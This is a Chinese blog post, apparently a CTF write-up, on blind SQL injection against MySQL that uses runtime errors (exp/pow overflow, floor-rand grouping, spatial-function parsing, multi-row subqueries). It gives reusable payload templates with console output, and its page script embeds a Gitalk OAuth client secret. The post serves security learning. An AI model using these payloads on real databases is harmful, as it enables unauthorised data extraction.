@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="Purse the balance of everything.">
+  <meta name="keywords" content="CTF, Blog">
+  
+    <link rel="icon" href>
+  
+    
+  <title>通过CISCN2019一道SQL注入思考基于运行时错误的盲注 | Mads Blog</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/css/my.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/gitalk.css">
+  <script src="/lib/gitalk.min.js"></script>
+  <link href="https://cdn.bootcss.com/font-awesome/5.7.0/css/all.css" rel="stylesheet">
+
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class='logo' href="/">
+      <i class="fas fa-cat" style="margin-right: 10px"></i>
+      <span>Mads Blog</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id='post'>
+  <div class="content">
+    <article>
+        <section class="content aath-body">
+          <h1>通过CISCN2019一道SQL注入思考基于运行时错误的盲注</h1>
+          
+          <div class='post-meta'>
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019年04月23日</time>
+            
+            
+              | 
+                  <i class="fa fa-tag" aria-hidden="true"></i>
+                
+               
+  <a href="/tags/#SQL" class='tag'>SQL</a>
+
+
+            
+            | <i class="fas fa-edit" aria-hidden="true"></i> <time>2019年08月02日</time>
+          </div>
+          
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次的CISCN WEB题感觉质量还不错。废话不多说，直接看题。</p>
+<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>第一天的SQL注入一题，很容易发现服务端的返回有两种，一种是<code>登录失败</code>，另一种<code>数据库操作失败</code>。可以意识到可以盲注，但是与一般的盲注好像不太一样。比较常遇到的是服务端会根据sql语句的逻辑<code>true or false</code>来返回不同的东西，但是这里是根据sql语句的执行情况的<code>true or false</code>来返回不同的东西。当然如果前一种情况sql语句执行失败，服务端返回500的情况，也是适用于第二种情况的盲注的。所以说第二种情况的盲注方法更加的通用。刚好之前去六室面试时，学长们出了一道利用exp函数的特性进行注入的题。当时那题我在机试时在网上搜了一大堆，但是能搜到利用exp函数的报错来进行注入，但是需要错误回显。但当时那题是没有错误回显的，只提示错误和失败。题目也禁用了时间函数，也就是没法基于时间进行盲注。本来已经在放弃边缘了，机试一道题没做出来很凉，但是快结束时候突然灵光一闪想到了可以利用exp函数的参数在大于709的情况下会导致sql语句执行失败，这样其实就找到了一种方法来利用服务端的两种不同回显来判断我们自定义表达式的真假。比如这个表达式是<code>709 + c - ascii(&#39;a&#39;)</code>，让<code>c</code>初始化为<code>126</code>（最大可见字符），我们把它作为参数传给<code>exp</code>函数，这时sql语句必然是执行失败的，因为<code>709 + 126 - ascii(&#39;a&#39;) &gt; 709</code>。然后我们不断的<code>c--</code>，直到<code>c == ascii(&#39;a&#39;)</code>，那么就相当于<code>exp(709 + c - c) == exp(709)</code>，sql语句就会执行成功，这时的<code>c</code>就是<code>ascii(a)</code>，利用这种思路就可以进行盲注了。赛后看到别人的wp，意识到不止<code>exp</code>函数，包括<code>cot</code>，<code>pow</code>等只要能得到超大数导致超过mysql的数值范围的，sql语句就会执行失败：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select pow(2,1024);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range <span class="keyword">in</span> <span class="string">'pow(2,1024)'</span></span><br><span class="line">mysql&gt; select cot(0);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range <span class="keyword">in</span> <span class="string">'cot(0)'</span></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range <span class="keyword">in</span> <span class="string">'exp(710)'</span></span><br></pre></td></tr></table></figure>
+<h1 id="发散"><a href="#发散" class="headerlink" title="发散"></a>发散</h1><p>当然我觉得除了利用MYSQL超过数值表示范围就报错这个点之外，还有其他的思路。我想到了是不是可以利用数学本身的约定来，比如除0操作。但是有意思的是mysql是允许除0的，只是会发生warning：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1/0;</span><br><span class="line">+------+</span><br><span class="line">| 1/0  |</span><br><span class="line">+------+</span><br><span class="line">| NULL |</span><br><span class="line">+------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span>, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>包括<code>log(-1)</code>等都没法让sql语句执行失败，看来还是需要利用mysql本身的特性来搞。我还尝试利用if语句的条件与mysql执行高权限操作报错的特性以及查询不存在表名、列名报错等特性，但是发现mysql解释器貌似会对sql语句进行预检查，而不会在执行时检查，这样我们if条件就没法生效。于是去查了下MYSQL的<a href="https://dev.mysql.com/doc/refman/5.7/en/server-error-reference.html" target="_blank" rel="noopener">官方文档</a>，发现错误种类非常多。而我们需要的错误类型是<em>sql语句运行时产生</em>的。比方说上面利用的错误<code>ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(2,1024)&#39;</code>就是sql语句在运行时计算时产生的错误。</p>
+<p>找呀找，找呀找。突然不想找了，意识到我们想要的运行时错误，不就是网上能搜到的那些报错注入的例子么。我们可以把他们变个方式，就可以进行盲注了。整理一下如下：</p>
+<h2 id="Floor"><a href="#Floor" class="headerlink" title="Floor"></a>Floor</h2><p>因为floor报错注入的原理本身就是基于rand()函数在sql语句执行时的多次调用，所以我们可以直接改成盲注。经过测试，可以将测试条件放在<code>group by</code>之后。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Floor 报错注入改为报错盲注</span></span><br><span class="line">mysql&gt; select count(*),floor(rand(0)*2)x from mysql.user group by <span class="keyword">if</span>(1,x,0);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry <span class="string">'1'</span> <span class="keyword">for</span> key <span class="string">'&lt;group_key&gt;'</span></span><br><span class="line">mysql&gt; select count(*),floor(rand(0)*2)x from mysql.user group by <span class="keyword">if</span>(0,x,0);</span><br><span class="line">+----------+---+</span><br><span class="line">| count(*) | x |</span><br><span class="line">+----------+---+</span><br><span class="line">|        5 | 0 |</span><br><span class="line">+----------+---+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h2 id="Spatial-Functions"><a href="#Spatial-Functions" class="headerlink" title="Spatial Functions"></a>Spatial Functions</h2><p>网上还普遍存在的通过传入非法参数给空间函数进行报错注入的方法，貌似在盲注的情况下没法成功。因为测试发现mysql解释器在解析sql语句中这类函数的参数时候就会检查合法性，所以不满足我们之前说的需要sql语句运行时检查的条件。但是在<a href="https://dev.mysql.com/doc/refman/5.7/en/gis-data-formats.html" target="_blank" rel="noopener">官方文档</a>发现了有意思的东西。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原方法没法让if条件生效</span></span><br><span class="line">mysql&gt; SELECT IF(1,ST_X(LINESTRING(mads)),0);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric <span class="string">'1'</span> value found during parsing</span><br><span class="line">mysql&gt; SELECT IF(0,ST_X(LINESTRING(mads)),0);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric <span class="string">'1'</span> value found during parsing</span><br></pre></td></tr></table></figure>
+<p>文档中发现了两个函数<code>ST_GeomFromText</code>、<code>ST_MPointFromText</code>可以从文本中解析Spatial function，我下意识的觉得这里可能可以绕过mysql解释器的预检查，测试了一下果然是可以的。需要说明的是<code>ST_GeomFromText</code>针对的是<code>POINT()</code>函数，<code>ST_MPointFromText</code>针对的是<code>MULTIPOINT()</code>函数。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT IF(1, ST_X(ST_GeomFromText(<span class="string">'POINT(mads)'</span>)), 0);</span><br><span class="line">ERROR 3037 (22023): Invalid GIS data provided to <span class="keyword">function</span> st_geometryfromtext.</span><br><span class="line">mysql&gt; SELECT IF(0, ST_X(ST_GeomFromText(<span class="string">'POINT(mads)'</span>)), 0);</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">| IF(0, ST_X(ST_GeomFromText(<span class="string">'POINT(mads)'</span>)), 0) |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">|                                              0 |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>于是整理了一下可用的函数payload如下：</p>
+<blockquote>
+<p><code>{}</code>中是需要判断的条件</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># POINT</span></span><br><span class="line">SELECT IF(&#123;&#125;, ST_X(ST_GeomFromText(<span class="string">'POINT(mads)'</span>)), 0);</span><br><span class="line">SELECT IF(&#123;&#125;, ST_MPointFromText(<span class="string">'MULTIPOINT (mads)'</span>),0);</span><br></pre></td></tr></table></figure>
+<p>这里还可以拓展下思路，就是其实我们需要的只是个动态解析变量的函数来绕过mysql解释器的预检，所以下面的payload同样都是可以的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT IF(&#123;&#125;, ST_X(MADS), 0);</span><br><span class="line">SELECT IF(&#123;&#125;, ST_MPointFromText(<span class="string">'MADS'</span>),0);</span><br><span class="line">SELECT IF(&#123;&#125;, ST_GeomFromText(<span class="string">'MADS'</span>),0);</span><br></pre></td></tr></table></figure>
+<h2 id="其他特性的报错"><a href="#其他特性的报错" class="headerlink" title="其他特性的报错"></a>其他特性的报错</h2><p>翻阅文档与测试之后，只找到额外的以下可行payload。</p>
+<ol>
+<li>基于错误号1242</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="keyword">if</span>(1, (select user from user), 0);</span><br><span class="line">ERROR 1242 (21000): Subquery returns more than 1 row</span><br><span class="line">mysql&gt; select <span class="keyword">if</span>(0, (select user from user), 0);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| <span class="keyword">if</span>(0, (select user from user), 0) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| 0                                 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>可能还有很多，这里只是举个栗子，就不一一列举，各位师傅感兴趣的可以自己尝试去找找。找到了新思路欢迎评论交流～</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文介绍了基于sql语句运行时发生错误的盲注，简称<code>基于运行时错误的盲注</code>(我起的)。并通过思维发散介绍了几种衍生的payload。由于本人精力与能力有限，肯定没有介绍完全。各位师傅可以自由发挥想象，想到了其他方法欢迎评论区讨论交流～</p>
+
+          
+<div class="post-copyright">
+<p><span>本文标题：</span>通过CISCN2019一道SQL注入思考基于运行时错误的盲注</p>
+<p><span>文章作者：</span>Mads</p>
+<p><span>发布时间：</span>2019/04/23 02:13:17</p>
+<p><span>更新时间：</span>2019/08/02 09:44:31</p>
+<p><span>原始链接：</span><a style="color: #bababa" href=" + data.permalink + ">http://lxzmads.github.io/2019/04/23/通过CISCN2019一道SQL注入思考基于运行时错误的盲注/</a></p>
+<p><span>许可协议：</span><i class="fab fa-creative-commons"></i><a rel="license" style="color: #bababa" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a><span class="warn">转载请保留原文链接及作者</span></p>
+</div>
+ 
+        </section>
+    </article>
+    
+    <div class="comment">
+        <div id="gitalk-container"></div>
+    </div>
+    
+  </div>
+  <aside>
+    
+    <div class="toc-container">
+        <h1>目录</h1>
+        <div class="content">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#题目分析"><span class="toc-number">2.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#发散"><span class="toc-number">3.</span> <span class="toc-text">发散</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Floor"><span class="toc-number">3.1.</span> <span class="toc-text">Floor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spatial-Functions"><span class="toc-number">3.2.</span> <span class="toc-text">Spatial Functions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他特性的报错"><span class="toc-number">3.3.</span> <span class="toc-text">其他特性的报错</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
+        </div>
+    </div>
+    
+  </aside>
+</main>
+
+<script type="text/javascript">
+const gitalk = new Gitalk({
+  clientID: "6ae565c159db15a6167c",
+  clientSecret: '6b81331560c108209346bc4807a5126da190e14c',
+  repo: 'blogcomments',
+  owner: 'lxzmads',
+  admin: ['lxzmads'],
+  id: decodeURI(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath-魔改版 by Mads</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="/lib/jquery.min.js"></script>
+<script src="/lib/in-view.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  var isDown = true
+  var oldY = 0
+  inView.offset(50)
+
+  document.body.addEventListener('touchstart', function(){});
+  
+  window.addEventListener('scroll', _.throttle(e => {
+    var currentY = window.scrollY
+    if((oldY - currentY) < 0) {
+      isDown = true
+    } else {
+      isDown = false
+    }
+    oldY = currentY
+  }, 250))
+
+  $("article img").each(function() {
+      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+      $(this).wrapAll(strA);
+  });
+
+  $('.toc-link').each(function() {
+      var href = $(this).attr("href");
+      
+      inView(href).on('exit', () => {
+        if (isDown) {
+          handleActive(href)
+        }
+      })
+
+      inView(href).on('enter', () => {
+        if (!isDown) {
+          handleActive(href)
+        }
+      })
+
+      this.onclick = function(e) {
+        var pos = $(href).offset().top - 10;
+        $("html,body").animate({scrollTop: pos}, 300);
+        setTimeout(() => {
+          handleActive(href)
+        }, 350)
+        return false
+      }
+  })
+
+  function handleActive(href) {
+    document.querySelectorAll('.toc-link').forEach(elm => {
+      elm.classList.remove('active')
+    })
+    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
+  }
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+</body>
+</html>
